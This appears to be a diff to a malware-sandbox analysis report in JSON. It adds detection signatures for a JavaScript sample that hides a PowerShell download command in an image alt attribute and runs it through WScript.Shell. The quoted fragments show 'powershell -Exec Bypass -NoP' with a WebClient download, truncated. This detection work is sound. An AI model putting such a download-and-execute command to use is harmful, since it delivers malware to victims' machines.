@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 552,
+    "score": 1572,
     "sections": [
       {
         "auto_collapse": false,
@@ -78,6 +78,94 @@
         },
         "tags": {},
         "title_text": "Signature: CreatesWshObject",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript runs PowerShell to call out to a URI\n\t\tWScript.Shell[15].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\tWScript.Shell[15].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...",
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "runs_ps1_to_download": 10
+          },
+          "signatures": {
+            "runs_ps1_to_download": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: PowerShellDownloader",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript runs elevated PowerShell via powershell.exe\n\t\tHTMLImageElement[11].alt = (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.webclien...\n\t\tHTMLImageElement[11].alt.get() => (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.w...\n\t\tHTMLImageElement[11].getAttribute(alt) => (string) 'powershell -Exec Bypass -NoP -C (new-object syst...\n\t\tWScript.Shell[15].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\tWScript.Shell[15].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\txt_jsjaws.setAttribute(\"alt\", \"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).dow...",
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 500,
+          "score_map": {
+            "runs_elevated_ps1": 500
+          },
+          "signatures": {
+            "runs_elevated_ps1": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: RunsElevatedPowerShell",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript runs PowerShell via powershell.exe with no profile\n\t\tHTMLImageElement[11].alt = (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.webclien...\n\t\tHTMLImageElement[11].alt.get() => (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.w...\n\t\tHTMLImageElement[11].getAttribute(alt) => (string) 'powershell -Exec Bypass -NoP -C (new-object syst...\n\t\tWScript.Shell[15].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\tWScript.Shell[15].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\txt_jsjaws.setAttribute(\"alt\", \"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).dow...",
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 500,
+          "score_map": {
+            "runs_ps1_no_profile": 500
+          },
+          "signatures": {
+            "runs_ps1_no_profile": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: RunsNoProfilePowerShell",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript runs PowerShell via powershell.exe\n\t\tHTMLImageElement[11].alt = (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.webclien...\n\t\tHTMLImageElement[11].alt.get() => (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.w...\n\t\tHTMLImageElement[11].getAttribute(alt) => (string) 'powershell -Exec Bypass -NoP -C (new-object syst...\n\t\tWScript.Shell[15].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\tWScript.Shell[15].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\txt_jsjaws.setAttribute(\"alt\", \"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).dow...",
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "runs_ps1": 10
+          },
+          "signatures": {
+            "runs_ps1": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: RunsPowerShell",
         "zeroize_on_tag_safe": false
       },
       {
@@ -272,6 +360,34 @@
         "heur_id": 3,
         "signatures": [
           "creates_wsh_object"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "runs_ps1_to_download"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "runs_elevated_ps1"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "runs_ps1_no_profile"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "runs_ps1"
         ]
       },
       {
